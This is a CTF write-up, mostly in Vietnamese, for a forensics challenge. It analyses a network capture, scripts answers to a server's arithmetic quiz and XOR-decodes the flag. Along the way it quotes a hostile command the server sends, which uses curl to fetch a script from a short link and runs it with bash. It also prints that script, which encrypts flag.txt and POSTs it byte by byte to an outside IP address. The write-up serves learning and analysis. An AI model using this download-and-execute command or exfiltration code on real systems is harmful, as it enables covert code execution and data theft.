# Description 

I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?

Author: Guesslemonger

![image](https://github.com/Kayiyan/CTF_Team_Write-up/assets/126185640/9b791c18-c837-40d5-81f8-8e953e5780cf)

# Solved

Challange cung cấp file `pcap` nên hãy bắt đầu phân tích và tìm kiếm dữ liệu quan trọng trong file trước : 

Khá nhiều gói tin có vẻ quan trọng được gửi đi hãy thử lấy chúng ra xem : 

![image](https://github.com/Kayiyan/CTF_Team_Write-up/assets/126185640/e83b126f-1365-4b55-b206-9aac41186bfb)

`Export Objects -> HTTP -> lưu tất cả vào 1 thư mục nào đó cần thiết để xử lí :`

![image](https://github.com/Kayiyan/CTF_Team_Write-up/assets/126185640/6ffca8ed-c013-4ceb-9295-4b9c06e7c7b8)


Okay, ở đây mỗi file đều chứa 1 dữ liệu gì đó sau `data` thử tổng hợp chúng lại và mình thu được 1 đoạn mã `hex` có vẻ như đây là `flag` nhưng đã được encrypt:

`20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f`

mình đã  sử dụng 1 đoạn python nhỏ để lấy dữ liệu trên : 

```python
import os
import json

folder_path = "C:\\Users\\DELL\\Downloads\\ctf\\forensic\\evalme\\test"

combined_values = []  # Danh sách giá trị của khóa "data"

num_files = 102  # Số lượng file %5c, %5c(1), %5c(2), ..., %5c(101)

for i in range(num_files):
    file_name = f"%5c({i})" if i > 0 else "%5c"  # Tạo tên file tương ứng
    full_path = os.path.join(folder_path, file_name)
    try:
        with open(full_path, "rb") as file:
            file_content = file.read()  # Đọc nội dung của file
            try:
                json_data = json.loads(file_content)
                data_value = json_data.get("data")
                if data_value is not None:
                    combined_values.append(data_value)
            except json.JSONDecodeError:
                pass  # Bỏ qua nếu không phải định dạng JSON
    except FileNotFoundError:
        pass  # Bỏ qua nếu file không tồn tại

# In ra các giá trị cách nhau bởi khoảng trắng
combined_line = ' '.join(combined_values)
print(combined_line)


```

Có vẻ như không còn gì quan trọng ở đây hãy tiếp tục xử lí đến server mà bài đã cung cấp : `nc chals.sekai.team 9000`

![image](https://github.com/Kayiyan/CTF_Team_Write-up/assets/126185640/82c94f21-8288-456d-ac59-42b0ebb659aa)

Kết nối lên và làm theo yêu cầu thì có vẻ như thông thường sẽ luôn nhận về kết quả `too slow` , vậy phải kết nối lên và đồng thời tính toán luôn sẽ kịp được tốc độ của máy, `pwntool` trong python sẽ giúp làm điều này :

```python
from pwn import *

def calculate(expression):
    parts = expression.split(' ')
    if len(parts) != 3:
        return None
    num1 = int(parts[0])
    operator = parts[1]
    num2 = int(parts[2])
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*':
        return num1 * num2
    elif operator == '/':
        return num1 / num2  

while True:
    try:
        conn = remote('c.chals.sekai.team', 9000)
        welcome_message = conn.recvline().decode().strip()
        print(welcome_message)

        for _ in range(100):
            problem = conn.recvline().decode().strip()
            print(problem)
            
            result = calculate(problem)
            if result is not None:
                conn.sendline(str(result).encode())
                response = conn.recvline().decode().strip()
                print(response)

        conn.close()
    except EOFError:
        print("Connection closed, retrying...")
        continue
    except KeyboardInterrupt:
        print("Interrupted by user.")
        break

```

Đợi 1 lúc và nhận được dòng tin nhắn sau từ server : `__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f#1 + 2ct.sh)>/dev/null 2>&1||true",shell=True)`

![image](https://github.com/Kayiyan/CTF_Team_Write-up/assets/126185640/0cef2a87-4efd-4095-8862-12be9c684d39)

Ở đây có chứa câu lệnh `curl` 1 file gì đó từ đường link kia, thử câu lệnh đó và thu được `code` của 1 file  : `curl -sL https://shorturl.at/fgjvU`

```bash
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'


# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }


XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```

Okay, ở đây có chứa giá trị `KEY` và thuật toán `xor` , quay lại lúc nãy mình có `flag` dưới dạng `hex` nhưng đã được encrypt ,  `xor` chúng với `key` thu được này và thu về được `FLAG` :

Có thể dùng `CyberChef` hoặc `Python` để `xor` :

`From CyberChef` : 

![image](https://github.com/Kayiyan/CTF_Team_Write-up/assets/126185640/47c74b04-362d-4183-82ea-129007d3ab85)


```python
from pwn import xor

hex_string = '20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f'
key = 's3k@1_v3ry_w0w'

hex_values = bytes.fromhex(hex_string.replace(' ', ''))
key_values = key.encode()

xor_result = xor(hex_values, key_values)
xor_result_hex = xor_result.hex()
last_result = bytes.fromhex(xor_result_hex)

print(last_result)
```

# Flag 

 `FLAG`  : `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`




